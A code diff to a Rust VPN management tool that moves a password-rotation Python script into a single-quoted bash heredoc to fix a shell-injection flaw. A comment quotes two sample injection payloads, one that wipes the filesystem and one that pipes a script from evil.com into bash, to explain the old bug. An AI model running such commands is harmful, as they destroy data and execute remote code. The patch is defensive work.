@@ -302,17 +302,23 @@ pub async fn server_rotate_user_password(
 
     let sudo = detect_sudo(handle, app).await;
     let dir = ENDPOINT_DIR;
-    // Shell-escape single-quote in username / password for python string literal
-    let escaped_user = vpn_username.replace('\\', "\\\\").replace('\'', "\\'");
-    let escaped_pass = new_password.replace('\\', "\\\\").replace('\'', "\\'");
 
+    // CR-03 mitigation: previous version put the python script inside double-quoted bash
+    // (`python3 -c "..."`), which leaves $, `, \, " unescaped and lets a password like
+    // `evil"; rm -rf /; #` or `$(curl evil.com|bash)` break out into shell. Now we use
+    // a single-quoted heredoc — bash performs NO substitutions inside it, and the only
+    // way to terminate is a literal `PY_ROTATE_EOF` line by itself.
+    //
+    // validate_vpn_password additionally rejects `'` and `\` (shell-unsafe in this context),
+    // so we don't need to escape inside the python string literal anymore. Other chars
+    // like `"`, `$`, `` ` `` are safe inside single-quoted heredoc.
     let rotate_cmd = format!(
-        r#"{sudo}python3 -c "
+        r#"{sudo}python3 << 'PY_ROTATE_EOF'
 import re, os, tempfile
 path = '{dir}/credentials.toml'
 with open(path, 'r') as f:
     content = f.read()
-pattern = r'(\[\[client\]\]\s*\nusername\s*=\s*\"{user}\"\s*\npassword\s*=\s*\")[^\"]*(\")'
+pattern = r'(\[\[client\]\]\s*\nusername\s*=\s*"{user}"\s*\npassword\s*=\s*")[^"]*(")'
 new_content, n = re.subn(pattern, lambda m: m.group(1) + '{pass}' + m.group(2), content)
 if n == 0:
     raise SystemExit(9)
@@ -320,11 +326,11 @@ fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path))
 with os.fdopen(fd, 'w') as f:
     f.write(new_content)
 os.replace(tmp, path)
-""#,
+PY_ROTATE_EOF"#,
         sudo = sudo,
         dir = dir,
-        user = escaped_user,
-        pass = escaped_pass,
+        user = vpn_username,
+        pass = new_password,
     );
 
     let (_, code) = exec_command(handle, app, &rotate_cmd).await?;
